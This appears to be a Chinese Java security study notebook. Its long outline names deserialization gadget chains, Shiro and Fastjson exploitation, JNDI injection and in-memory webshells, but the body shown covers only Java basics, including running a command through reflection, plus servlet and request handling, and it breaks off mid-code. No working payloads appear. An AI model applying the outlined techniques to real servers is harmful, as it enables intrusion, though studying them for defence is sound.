- [Java基础](#java基础)
  - [反射篇](#反射篇)
      - [不利用反射执行命令](#不利用反射执行命令)
      - [反射执行命令](#反射执行命令)
  - [注解篇](#注解篇)
  - [Servlet篇](#servlet篇)
      - [中间件](#中间件)
      - [基础概念](#基础概念)
      - [Servlet](#servlet)
  - [Request篇](#request篇)
      - [概念](#概念)
      - [Request请求](#request请求)
      - [请求转发](#请求转发)
      - [共享数据](#共享数据)
  - [Response篇](#response篇)
      - [Response](#response)
      - [重定向代码](#重定向代码)
      - [Writer方法使用](#writer方法使用)
      - [ServletContext](#servletcontext)
  - [Cookie与Session篇](#cookie与session篇)
      - [Cookie](#cookie)
      - [Session](#session)
  - [EL与JSTL篇](#el与jstl篇)
      - [EL表达式](#el表达式)
      - [JSTL](#jstl)
  - [JSP篇](#jsp篇)
      - [概念](#概念-1)
      - [Jsp编写](#jsp编写)
  - [JSP九大内置对象](#jsp九大内置对象)
  - [Filter与Listener篇](#filter与listener篇)
      - [Filter过滤器](#filter过滤器)
      - [注解配置拦截路径](#注解配置拦截路径)
      - [定义拦截方式](#定义拦截方式)
      - [Listener监听器](#listener监听器)
  - [jackson篇](#jackson篇)
      - [json](#json)
      - [jsckson解析器](#jsckson解析器)
      - [对象转Json](#对象转json)
      - [list集合转换json](#list集合转换json)
      - [json 转java对象](#json-转java对象)
  - [动态代理篇](#动态代理篇)
  - [框架](#框架)
  - [JDBC篇](#jdbc篇)
      - [使用](#使用)
  - [数据库连接池](#数据库连接池)
      - [概念](#概念-2)
      - [连接池实现](#连接池实现)
      - [C3P0创建线程池：](#c3p0创建线程池)
      - [Druid数据库连接池](#druid数据库连接池)
      - [Spring JDBC](#spring-jdbc)
  - [Mybatis篇](#mybatis篇)
      - [概述](#概述)
      - [配置](#配置)
      - [使用](#使用-1)
      - [注解使用](#注解使用)
  - [Spring篇](#spring篇)
      - [使用的意义](#使用的意义)
      - [IOC](#ioc)
      - [IOC创建对象方式](#ioc创建对象方式)
      - [Spring配置](#spring配置)
      - [set注入](#set注入)
      - [p 命名和c命名注入](#p-命名和c命名注入)
      - [Bean作用域](#bean作用域)
      - [Bean自动装配](#bean自动装配)
        - [byName](#byname)
        - [byType](#bytype)
      - [使用注解开发](#使用注解开发)
        - [Bean的实现](#bean的实现)
        - [属性注入](#属性注入)
        - [衍生注解](#衍生注解)
      - [小结](#小结)
      - [基于Java类进行配置](#基于java类进行配置)
  - [静态/动态代理模式](#静态动态代理模式)
      - [静态代理](#静态代理)
      - [动态代理](#动态代理)
  - [Spring-AOP篇](#spring-aop篇)
      - [实现](#实现)
  - [Spring整合Mybatis](#spring整合mybatis)
  - [Spring MVC篇](#spring-mvc篇)
      - [概述](#概述-1)
      - [配置版](#配置版)
      - [注解版](#注解版)
      - [Restful](#restful)
      - [常用注解](#常用注解)
      - [拦截器](#拦截器)
  - [SSM整合](#ssm整合)
      - [Spring整合SpringMVC](#spring整合springmvc)
      - [整合 Mybatis](#整合-mybatis)
      - [配置事务管理](#配置事务管理)
  - [SpringBoot篇](#springboot篇)
- [java 安全](#java-安全)
  - [SQL注入篇](#sql注入篇)
      - [JDBC注入分析](#jdbc注入分析)
      - [JDBC预编译](#jdbc预编译)
      - [Mybatis注入](#mybatis注入)
        - [**like注入**](#like注入)
        - [in后注入](#in后注入)
        - [order by 注入](#order-by-注入)
      - [CMS审计](#cms审计)
  - [XSS篇](#xss篇)
      - [反射型XSS](#反射型xss)
      - [存储型xss](#存储型xss)
      - [DOM型xss](#dom型xss)
      - [防御](#防御)
      - [htmlspecialchars](#htmlspecialchars)
      - [全局的XSSFilter](#全局的xssfilter)
      - [RASP XSS攻击防御](#rasp-xss攻击防御)
      - [RASP XSS防御能力测试](#rasp-xss防御能力测试)
      - [cms 审计](#cms-审计)
  - [SSRF篇](#ssrf篇)
  - [文件类漏洞篇](#文件类漏洞篇)
        - [1. 文件访问类漏洞](#1-文件访问类漏洞)
        - [2. 任意文件读取](#2-任意文件读取)
        - [3. 写文件](#3-写文件)
        - [4. 删除文件](#4-删除文件)
        - [5. 文件/目录复制、移动](#5-文件目录复制移动)
        - [6. 重命名文件](#6-重命名文件)
        - [7. 文件目录遍历](#7-文件目录遍历)
        - [8. NIO任意文件读取](#8-nio任意文件读取)
        - [9. 任意文件/目录访问漏洞修复](#9-任意文件目录访问漏洞修复)
        - [10. Java恶意文件访问审计建议](#10-java恶意文件访问审计建议)
        - [11. Java恶意文件访问总结](#11-java恶意文件访问总结)
  - [命令执行篇](#命令执行篇)
        - [1. Java本地命令执行](#1-java本地命令执行)
        - [2. Runtime命令执行](#2-runtime命令执行)
        - [3.ProcessBuilder命令执行](#3processbuilder命令执行)
        - [4. UNIXProcess/ProcessImpl](#4-unixprocessprocessimpl)
  - [XXE篇](#xxe篇)
- [序列化与反序列化](#序列化与反序列化)
  - [概念](#概念-3)
      - [主要接口和类](#主要接口和类)
      - [transient 关键字](#transient-关键字)
      - [SerialVersionUId](#serialversionuid)
  - [序列化原理和算法----基础数据](#序列化原理和算法----基础数据)
  - [基本数据类型序列化](#基本数据类型序列化)
  - [基本数据"顺序"和"越界"](#基本数据顺序和越界)
  - [基本数据的包装类型](#基本数据的包装类型)
  - [对象引用探索](#对象引用探索)
  - [源码分析](#源码分析)
      - [ObjectOutputStream](#objectoutputstream)
- [ClassLoader](#classloader)
  - [ClassLoader（类加载机制）](#classloader类加载机制)
  - [Java类](#java类)
  - [ClassLoader](#classloader-1)
  - [Java类动态加载方式](#java类动态加载方式)
  - [ClassLoader类加载流程](#classloader类加载流程)
  - [自定义ClassLoader](#自定义classloader)
  - [URLClassLoader](#urlclassloader)
  - [类加载隔离](#类加载隔离)
      - [跨类加载器加载](#跨类加载器加载)
  - [JSP自定义类加载后门](#jsp自定义类加载后门)
  - [BCELClassLoader](#bcelclassloader)
      - [BCEL攻击原理](#bcel攻击原理)
      - [BCEL编解码](#bcel编解码)
  - [Xalan ClassLoader](#xalan-classloader)
  - [JSP类加载](#jsp类加载)
- [Javassist动态编程](#javassist动态编程)
  - [介绍](#介绍)
  - [使用](#使用-2)
      - [**ClassPool**](#classpool)
      - [CtClass](#ctclass)
      - [CtMethod](#ctmethod)
      - [CtConstructor](#ctconstructor)
      - [ClassClassPath](#classclasspath)
  - [代码](#代码)
  - [toBytecode](#tobytecode)
  - [toClass](#toclass)
  - [PS](#ps)
  - [想法实现](#想法实现)
- [URLdns链](#urldns链)
  - [ysoserial运行流程分析](#ysoserial运行流程分析)
  - [URLDNS使用](#urldns使用)
  - [URLDNS链分析](#urldns链分析)
  - [思考](#思考)
- [CommonsCollections1链](#commonscollections1链)
  - [Transformer](#transformer)
  - [ConstantTransformer](#constanttransformer)
  - [InvokerTransformer](#invokertransformer)
  - [ChainedTransformer](#chainedtransformer)
  - [TransformedMap](#transformedmap)
  - [分析](#分析)
  - [AnnotationInvocationHandler](#annotationinvocationhandler)
  - [POC](#poc)
  - [高版本问题](#高版本问题)
  - [ysoserial](#ysoserial)
  - [LazyMap](#lazymap)
  - [Java动态代理](#java动态代理)
  - [POC](#poc-1)
  - [ysoserial的操作](#ysoserial的操作)
- [CommonsCollections2链](#commonscollections2链)
  - [PriorityQueue](#priorityqueue)
  - [TransformingComparator](#transformingcomparator)
  - [POC1](#poc1)
  - [javassist](#javassist)
      - [使用](#使用-3)
      - [ClassPool](#classpool-1)
      - [CtClass](#ctclass-1)
      - [CtMethod](#ctmethod-1)
      - [CtConstruct](#ctconstruct)
      - [CtField](#ctfield)
      - [动态生成类](#动态生成类)
      - [动态获取类方法](#动态获取类方法)
      - [javassist特殊参数](#javassist特殊参数)
  - [ClassLoader](#classloader-2)
  - [TemplatesImpl](#templatesimpl)
  - [POC2](#poc2)
  - [poc1和poc2区别](#poc1和poc2区别)
  - [ysoserial CC2](#ysoserial-cc2)
- [CommonsCollections3](#commonscollections3)
  - [POC1](#poc1-1)
  - [ysoserial CC3](#ysoserial-cc3)
      - [TrAXFilter](#traxfilter)
      - [InstantiateTransformer](#instantiatetransformer)
  - [POC2](#poc2-1)
  - [POC3](#poc3)
- [CommonsCollection4](#commonscollection4)
- [CommonsCollection5](#commonscollection5)
  - [POC](#poc-2)
  - [调试](#调试)
- [CommonsCollections6](#commonscollections6)
  - [POC](#poc-3)
  - [分析](#分析-1)
  - [调试](#调试-1)
  - [POC2](#poc2-2)
- [CommonsCollections7链](#commonscollections7链)
  - [poc](#poc-4)
  - [分析](#分析-2)
  - [调试](#调试-2)
- [CommonsCollections8](#commonscollections8)
  - [poc](#poc-5)
  - [分析](#分析-3)
  - [调试](#调试-3)
- [CommonsCollections9](#commonscollections9)
  - [poc](#poc-6)
  - [分析](#分析-4)
  - [调试](#调试-4)
- [commons-collections10](#commons-collections10)
  - [poc](#poc-7)
  - [分析](#分析-5)
  - [调试](#调试-5)
- [CommonsCollections11](#commonscollections11)
- [CommonsCollections12](#commonscollections12)
  - [JDK内置JS引擎](#jdk内置js引擎)
- [CommonsBeanutils](#commonsbeanutils)
  - [getter 的妙用](#getter-的妙用)
  - [POC 构造](#poc-构造)
- [JDK7U21原生链](#jdk7u21原生链)
  - [原理](#原理)
  - [如何调用equalsImpl](#如何调用equalsimpl)
  - [找到equals方法调用链](#找到equals方法调用链)
  - [Magic Number](#magic-number)
  - [利用链梳理](#利用链梳理)
  - [poc](#poc-8)
  - [调试](#调试-6)
  - [修复](#修复)
  - [思考](#思考-1)
  - [ysoserial:](#ysoserial-1)
- [JDK8u20原生链](#jdk8u20原生链)
  - [基础知识](#基础知识)
  - [try...catch...嵌套](#trycatch嵌套)
  - [java 序列化](#java-序列化)
  - [JDK8U20](#jdk8u20)
- [CC链总结](#cc链总结)
- [Groovy1](#groovy1)
  - [前置知识](#前置知识)
      - [MethodClosure](#methodclosure)
      - [String.execute() 方法](#stringexecute-方法)
      - [ConvertedClosure](#convertedclosure)
  - [POC](#poc-9)
  - [调试](#调试-7)
  - [ysoserial](#ysoserial-2)
  - [总结](#总结)
- [Hibernate1](#hibernate1)
  - [前置知识](#前置知识-1)
      - [BasicPropertyAccessor](#basicpropertyaccessor)
      - [AbstractComponentTuplizer](#abstractcomponenttuplizer)
      - [TypedValue](#typedvalue)
  - [GetterMethodImpl](#gettermethodimpl)
  - [POC](#poc-10)
- [Hibernate2](#hibernate2)
  - [POC](#poc-11)
  - [总结](#总结-1)
- [Spring1](#spring1)
- [Shiro](#shiro)
  - [Shiro<1.2.4-RememberMe](#shiro124-rememberme)
      - [原理](#原理-1)
      - [CommonsCollections3.2.1 POC](#commonscollections321-poc)
        - [解决报错](#解决报错)
        - [构造不含数组的反序列化Gadget](#构造不含数组的反序列化gadget)
        - [POC](#poc-12)
      - [CommonsCollections 4.0 POC](#commonscollections-40-poc)
      - [CommonsBeanutils POC](#commonsbeanutils-poc)
      - [无依赖Shiro反序列化利用链](#无依赖shiro反序列化利用链)
  - [调试](#调试-8)
      - [加密](#加密)
      - [解密](#解密)
  - [Shiro<1.4.2](#shiro142)
      - [原理](#原理-2)
      - [分析](#分析-6)
      - [环境搭建](#环境搭建)
      - [漏洞利用](#漏洞利用)
      - [修复](#修复-1)
  - [收集 key](#收集-key)
  - [CVE2016-6802](#cve2016-6802)
  - [CVE2020-11989](#cve2020-11989)
  - [shiro 检测key](#shiro-检测key)
  - [shiro 动态修复key](#shiro-动态修复key)
- [内存马](#内存马)
  - [简介](#简介)
  - [获取 context](#获取-context)
  - [Tomcat-Filter](#tomcat-filter)
      - [请求过滤需要的Filter接口](#请求过滤需要的filter接口)
      - [应用启动需要的接口](#应用启动需要的接口)
      - [启动前的加载过程](#启动前的加载过程)
      - [请求到达时的处理流程](#请求到达时的处理流程)
      - [注册流程总结](#注册流程总结)
      - [实现](#实现-1)
      - [效果](#效果)
  - [Tomcat-Filter型内存马一](#tomcat-filter型内存马一)
      - [Tomcat](#tomcat)
      - [filter 型内存马](#filter-型内存马)
      - [tomcat filter流程分析](#tomcat-filter流程分析)
      - [Filter 型内存马注入- tomcat7.x 以上](#filter-型内存马注入--tomcat7x-以上)
  - [Tomcat-Filter内存马版本问题](#tomcat-filter内存马版本问题)
  - [Tomcat-Filter型内存马二](#tomcat-filter型内存马二)
  - [Tomcat-Litener型内存马](#tomcat-litener型内存马)
      - [ServletRequestListener接口](#servletrequestlistener接口)
      - [StandardContext 对象](#standardcontext-对象)
  - [Tomcat-Listener型内存马](#tomcat-listener型内存马)
      - [恶意Listener构造](#恶意listener构造)
      - [listener 注册流程](#listener-注册流程)
      - [构造](#构造)
  - [Tomcat-servlet型内存马](#tomcat-servlet型内存马)
      - [创建分析](#创建分析)
  - [spring 型内存马](#spring-型内存马)
      - [基础知识](#基础知识-1)
      - [Bean](#bean)
      - [ApplicationContext](#applicationcontext)
      - [ContextLoaderListener 于 DispatcherServlet](#contextloaderlistener-于-dispatcherservlet)
      - [ContextLoaderListener](#contextloaderlistener)
      - [DispatcherServlet](#dispatcherservlet)
      - [实现思路](#实现思路)
  - [获取 Context](#获取-context-1)
  - [Spring Controller内存马](#spring-controller内存马)
      - [获取 Context](#获取-context-2)
      - [手动注册 controller](#手动注册-controller)
      - [方法一 registerMapping](#方法一-registermapping)
      - [方法二 registerHandler](#方法二-registerhandler)
      - [方法三 detectHandlerMethod](#方法三-detecthandlermethod)
      - [controller 中的 webshell 逻辑](#controller-中的-webshell-逻辑)
      - [注意事项](#注意事项)
  - [spring mvc controller内存马](#spring-mvc-controller内存马)
      - [fastjson反序列化和JNDI](#fastjson反序列化和jndi)
      - [向Spring mvc 注入 controller](#向spring-mvc-注入-controller)
      - [获取request和response](#获取request和response)
      - [阻止重复添加controller(非必须)](#阻止重复添加controller非必须)
      - [实验](#实验)
      - [恶意源代码](#恶意源代码)
      - [测试](#测试)
      - [注入冰蝎代码](#注入冰蝎代码)
  - [Spring mvc Interceptor内存马](#spring-mvc-interceptor内存马)
      - [基础拦截器](#基础拦截器)
      - [拦截器调用链](#拦截器调用链)
      - [拦截器是如何被添加的](#拦截器是如何被添加的)
      - [实践](#实践)
  - [Java agent 内存马注入](#java-agent-内存马注入)
  - [中间件内存马注入](#中间件内存马注入)
  - [内存马学习](#内存马学习)
  - [内存马查杀](#内存马查杀)
- [回显](#回显)
  - [基于全局储存的新思路 | Tomcat的一种通用回显方法研究](#基于全局储存的新思路--tomcat的一种通用回显方法研究)
  - [Tomcat半通过回显](#tomcat半通过回显)
  - [挖掘回显链](#挖掘回显链)
  - [回显方式](#回显方式)
  - [defineClass异常回显](#defineclass异常回显)
  - [URLClassloader抛出异常](#urlclassloader抛出异常)
      - [改造 CC链](#改造-cc链)
  - [RMI 绑定实例回显](#rmi-绑定实例回显)
  - [写文件](#写文件)
  - [dnslog](#dnslog)
  - [Tomcat回显](#tomcat回显)
- [shiro + 回显 + 内存马](#shiro--回显--内存马)
  - [反序列化+回显](#反序列化回显)
  - [绕过 maxHttpHeaderSize](#绕过-maxhttpheadersize)
      - [修改 maxHttpHeaderSize](#修改-maxhttpheadersize)
      - [将class bytes 使用gzip+base64压缩编码](#将class-bytes-使用gzipbase64压缩编码)
      - [从 POST 请求体中发送字节码数据](#从-post-请求体中发送字节码数据)
  - [shiro植入内存马](#shiro植入内存马)
  - [shiro注入冰蝎内存马](#shiro注入冰蝎内存马)
  - [shiro+springboot](#shirospringboot)
  - [shiro内存马兼容tomcat和 springboot](#shiro内存马兼容tomcat和-springboot)
- [Java Agent](#java-agent)
  - [Java Agent 机制](#java-agent-机制)
  - [Java Agent](#java-agent-1)
  - [Instrumentation](#instrumentation)
  - [ClassFileTransformer](#classfiletransformer)
  - [Premain](#premain)
  - [agentmain](#agentmain)
  - [VirtualMachine](#virtualmachine)
  - [Instrumentation](#instrumentation-1)
  - [Java Agent技术实现](#java-agent技术实现)
- [RMI](#rmi)
  - [代码实现](#代码实现)
      - [Registry 注册中心](#registry-注册中心)
      - [Server 服务端](#server-服务端)
      - [Client 客户端](#client-客户端)
      - [启动流程](#启动流程)
      - [流量分析](#流量分析)
  - [特性](#特性)
  - [源码分析](#源码分析-1)
  - [RMI利用](#rmi利用)
  - [客户端|服务端攻击Registry注册中心](#客户端服务端攻击registry注册中心)
      - [ysoserial  另一种方式](#ysoserial--另一种方式)
  - [攻击Server端](#攻击server端)
      - [**注册中心攻击服务端**](#注册中心攻击服务端)
      - [**客户端攻击服务端**](#客户端攻击服务端)
  - [攻击Client端](#攻击client端)
      - [服务端攻击客户端](#服务端攻击客户端)
      - [注册中心攻击客户端](#注册中心攻击客户端)
  - [局限](#局限)
  - [JEP290 基本概念](#jep290-基本概念)
  - [jndi](#jndi)
  - [针对 RMI 服务的九重攻击-上](#针对-rmi-服务的九重攻击-上)
      - [探测利用开放的RMI服务](#探测利用开放的rmi服务)
        - [BaRMIe enum模式](#barmie-enum模式)
      - [BaRMIe 如何探测开放的 RMI 服务的攻击模块怎么实现](#barmie-如何探测开放的-rmi-服务的攻击模块怎么实现)
      - [BaRMIe attack 攻击模式](#barmie-attack-攻击模式)
      - [RMI服务端反序列化攻击RMI注册端](#rmi服务端反序列化攻击rmi注册端)
- [JNDI](#jndi-1)
  - [JNDI注入原理及利用](#jndi注入原理及利用)
      - [RMI+JNDI Reference payload <JDK 1.8u191](#rmijndi-reference-payload-jdk-18u191)
      - [分析](#分析-7)
      - [版本修复](#版本修复)
      - [工具起rmi ldap服务](#工具起rmi-ldap服务)
      - [com.sun.rowset.JdbcRowSetImpl 利用链](#comsunrowsetjdbcrowsetimpl-利用链)
      - [RMI+LDAP注入java版本限制](#rmildap注入java版本限制)
      - [LDAP+JNDI](#ldapjndi)
      - [LDAP POC](#ldap-poc)
      - [调试分析](#调试分析)
  - [绕过JDK高版本进行JNDI注入](#绕过jdk高版本进行jndi注入)
      - [通过本地加载类 | RMI+jndi](#通过本地加载类--rmijndi)
      - [调试分析](#调试分析-1)
      - [通过本地反序列化链 | LDAP+JNDI](#通过本地反序列化链--ldapjndi)
      - [调试分析](#调试分析-2)
- [Fastjson](#fastjson)
  - [使用](#使用-4)
  - [测试demo](#测试demo)
  - [为什么自动调用方法](#为什么自动调用方法)
  - [1.2.22-1.2.24](#1222-1224)
      - [JNDI jdbcRowSetImpl利用链](#jndi-jdbcrowsetimpl利用链)
      - [TemplatesImpl 利用链](#templatesimpl-利用链)
      - [调试分析](#调试分析-3)
      - [问题](#问题)
  - [1.2.25-1.2.41](#1225-1241)
      - [poc](#poc-13)
  - [1.2.42](#1242)
      - [poc](#poc-14)
  - [1.2.43](#1243)
      - [poc](#poc-15)
  - [1.2.44](#1244)
  - [1.2.45](#1245)
  - [1.2.46](#1246)
  - [1.2.47 通杀](#1247-通杀)
  - [1.2.48](#1248)
  - [1.2.62](#1262)
  - [1.2.66](#1266)
  - [payload](#payload)
  - [fastjson 深入](#fastjson-深入)
- [log4j2](#log4j2)
  - [jndi](#jndi-2)
  - [RC1 绕过分析](#rc1-绕过分析)
  - [RC2 修复](#rc2-修复)
  - [log4j2 DOS](#log4j2-dos)
- [codeql](#codeql)
- [JNI](#jni)
  - [基础](#基础)
  - [JNI-定义native方法](#jni-定义native方法)
  - [JNI-生成类头文件](#jni-生成类头文件)
  - [JNI-基础数据类型](#jni-基础数据类型)
  - [JNI - 编写C/C++本地命令执行实现](#jni---编写cc本地命令执行实现)
- [Weblogic T3协议](#weblogic-t3协议)
  - [T3协议](#t3协议)
      - [环境搭建](#环境搭建-1)
      - [T3协议概述](#t3协议概述)
      - [T3协议结构](#t3协议结构)
      - [漏洞复现](#漏洞复现)
      - [复现](#复现)
  - [CVE-2015-4852 分析](#cve-2015-4852-分析)
      - [resolveClass作用](#resolveclass作用)
      - [修复](#修复-2)
  - [CVE-2016-0638](#cve-2016-0638)
  

# Java基础

## 反射篇

获取Class对象的方式

1. Class.forName("全类名")
2. 类名.class
3. 对象.getClass()

同一个字节码文件(*.class)在一次程序运行过程中，只会被加载一次，不论通过哪一种方式获取的Class对象都是同一个。

#### 不利用反射执行命令

```JAVA
import sun.misc.IOUtils;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class exec1 {
    public static void main(String[] args) {
        try {
            Process exec = Runtime.getRuntime().exec("ipconfig");
            InputStream inputStream = exec.getInputStream();
            InputStreamReader inputStreamReader = new InputStreamReader(inputStream,"GBK");
            int len = -1;
            char[] b = new char[1024];
            while((len=inputStreamReader.read(b))!=-1){
                System.out.println(new String(b,0,len));
            }
            System.out.println(System.getProperty("file.encoding"));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

#### 反射执行命令

```java
import sun.misc.IOUtils;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class reflect_exec {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        String command = "ipconfig";
        Class<?> aClass = Class.forName("java.lang.Runtime");
        Constructor<?> constructor = aClass.getDeclaredConstructor();
        constructor.setAccessible(true);
        Runtime o = (Runtime) constructor.newInstance();

        Method method = aClass.getMethod("exec", String.class);
        Process o1 = (Process) method.invoke(o, command);
        InputStream inputStream = o1.getInputStream();
        InputStreamReader inputStreamReader = new InputStreamReader(inputStream, "gbk");
        int len = -1;
        char[] chars = new char[1024];
        while ((len=inputStreamReader.read(chars))!=-1){
            System.out.println(new String(chars,0,len));
        }
    }
}

```

method.invoke的第一个参数必须是类实例对象，如果调用的是static方法那么第一个参数值可以传null，因为在java中调用静态方法是不需要有类实例的，因为可以直接类名.方法名(参数)的方式调用。

method.invoke的第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，如果有参数那么就必须严格的依次传入对应的参数类型。

## 注解篇

Java注解（Annotation）又称Java标注，是JDK5.0约会的一种注释机制。
 和Javadoc不同，Java标注可以通过反射获取标注内容。在编译器生成类文件时，标注可以被嵌入到字节码中。 Java虚拟机可以保留注释内容，在运行时可以获取到注释内容。当然它也支持自定义Java注释。

它是JDK1.5及以后版本引入的一个特性，与类、接口、枚举是在同一个层次。它可以声明在包、类、字段、方法、局部变量、方法参数等的前面，用来对这些元素进行说明，注释。

作用分类：
 ①编写文档：通过代码里标识的元数据生成文档【生成文档doc文档】
 ② 代码分析：通过代码里标识的元数据对代码进行分析【使用反射】
 ③编译检查：通过代码里标识的元数据让编译器能够实现基本的编译检查【Override】

jdk自带注解：

```
* @Override	：检测被该注解标注的方法是否是继承自父类(接口)的
	* @Deprecated：该注解标注的内容，表示已过时
	* @SuppressWarnings：压制警告
```

被`Deprecated` 修饰过后的方法表示已过时，调用时会出现一条横线。

![image-20211231151416129](img/image-20211231151416129.png)

**自定义注解**

```java
元注解
public @interface 注解名称{
    属性列表;
}
```

注解本质上是一个接口，该接口默认继承Annotation 接口，注解里面可以定义抽象方法。

MyAnno.java

```java
public @interface MyAnno {
    int age();
    String name() default "anno";
}
```

AnnoTest.java

```java
@MyAnno(age = 1,name="hello")
public class AnnoTest {

}
```

## Servlet篇

#### 中间件

java常用的个几个中间件

```
* webSphere：IBM公司，大型的JavaEE服务器，支持所有的JavaEE规范，收费的。
* JBOSS：JBOSS公司的，大型的JavaEE服务器，支持所有的JavaEE规范，收费的。
* Tomcat：Apache基金组织，中小型的JavaEE服务器，仅仅支持少量的JavaEE规范servlet/jsp。开源的，免费的。

```

#### 基础概念

部署jsp网站的时候通常将文件打包成war包，然后进行上传，会自动解压。

war包结构

![image-20211231152511602](img/image-20211231152511602.png)

tomcat网站许你路径配置：

```
配置conf/server.xml文件
在<Host>标签体中配置
<Context docBase="D:\hello" path="/hehe" />
* docBase:项目存放的路径
* path：虚拟目录
```

配置完后，访问 `127.0.0.1:8080/hehe` 的时候，tomcat就会查找本机d盘hello目录。

还有两种方法是直接写 xx.xml 到 tomcat\conf\Catalina\localhost 目录下，

```
在conf\Catalina\localhost创建任意名称的xml文件。在文件中编写
<Context docBase="D:\hello" />
* 虚拟目录：xml文件的名称
```

#### Servlet

Servlet是一个接口，定义了java 类被浏览器访问到tomcat的规则。

新建 maven 项目，导入 web框架支持，导入所需 lib jar 包`servlet-api.jar` ,在 tomcat 里有。

编写类：

```java
package test;

import javax.servlet.*;
import java.io.IOException;

public class servletTest implements Servlet {
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {
        System.out.println("init");
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        System.out.println("service");
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {
        System.out.println("destroy");
    }
}
```

配置 web.xml:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <servlet-name>demo</servlet-name>
        <servlet-class>test.servletTest</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>demo</servlet-name>
        <url-pattern>/demo</url-pattern>
    </servlet-mapping>
</web-app>
```

执行原理：

1. 当服务器接收到客户端浏览器的请求后，会解析请求 url 路径，获取访问的Servlet的资源路径

2. 查找 web.xml 文件，是否有对应的 `<url-pattern>` 标签体内容

3. 如果有，则在找到对应的 `<servlet-class>` 全类名

4. tomcat 会将字节码文件加载进内存，并且创建其对象

5. 调用其方法

在 Servlet3.0 版本以后可以不用写 web.xml 文件，可直接使用注解定义加载。

```java
package test;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;

@WebServlet(urlPatterns = "/demo2")
public class servletTest2 implements Servlet {
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {

    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
```

但是我们这样定义每次都需要去继承 servlet 类，然后对几个方法及逆行重写，这样会多出很多代码，而在 java 里面给我们提供了几个servlet的实现类。

```txt
GenericServlet抽象类：该类继承了 service()的几个方法进行重写，其他方法进行实现。使用时只需重写 service() 就可以了
HttpServlet抽象类：对 http协议的一种封装，简化操作，
	定义继承 HttpServlet
	复写 doGet/doPost 方法
```

![image-20211231154717590](img/image-20211231154717590.png)

```java
package test;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet(urlPatterns = "/demo3")
public class HttpServletTest extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("get 请求");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("post 请求");
    }
}
```

## Request篇

#### 概念

> Request和Reponse对象是由服务器创建的，我们来使用它们
>
> Request对象是用来获取请求消息，Response对象是用来设置响应消息。

```txt
 ServletRequest      --接口
              丨继承
       HttpServlet      --接口
              丨实现
       org.apache.catalina.connector.RequestFacade 类(tomcat)
```

#### Request请求

常用方法：

```txt
String getMethod()              获取请求方式
String getContextPath()         获取虚拟路径
String getServletPath()         获取Servlet路径
String getQueryString()         获取get请求方式参数
String getRequestURI()          获取请求uri
StringBuffer getRequestURL()    获取URL
String getProtocol()            获取协议版本
String getRemoteAddr()          获取客户端ip
String getHeader(String name)   通过请求头的名称获取请求头的值
Enumeration<String> getHeaderNames(): 获取所有的请求头名称
```

代码：

```java
package test;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;

@WebServlet(urlPatterns = "/demo4")
public class Reqtest extends HttpServletTest{
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String header = req.getHeader("user-agent"); // 获取UA
        System.out.println(header);
        String method = req.getMethod();//获取请求方式
        System.out.println(method);
        String contextPath = req.getContextPath(); // 获取虚拟路径
        System.out.println(contextPath);
        String servletPath = req.getServletPath(); // 获取servlet 路径
        System.out.println(servletPath);
        String queryString = req.getQueryString();//获取get请求参数
        System.out.println(queryString);
        String requestURI = req.getRequestURI(); // 获取URI路径
        System.out.println(requestURI);
        StringBuffer requestURL = req.getRequestURL();// 获取URL路径
        System.out.println(requestURL);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        BufferedReader reader = req.getReader();
        String line = null;
        while ((line = reader.readLine())!=null){
            System.out.println(line);
        }
    }
}

```

获取POST 请求数据

```txt
*  BufferedReader getReader()：获取字符输入流，只能操作字符数据
ServletInputStream getInputStream()：获取字节输入流，可以操作所有类型数据

```

通用方式：

```txt
String getParameter(String name):根据参数名称获取参数值
String[] getParameterValues(String name):根据参数名称获取参数值的数组
Enumeration<String> getParameterNames():获取所有请求的参数名称
 Map<String,String[]> getParameterMap():获取所有参数的map集合
```

```java
package test;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.Enumeration;
import java.util.Map;
import java.util.Set;

@WebServlet(urlPatterns = "/demo5")
public class ReqTest2 extends HttpServletTest{
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
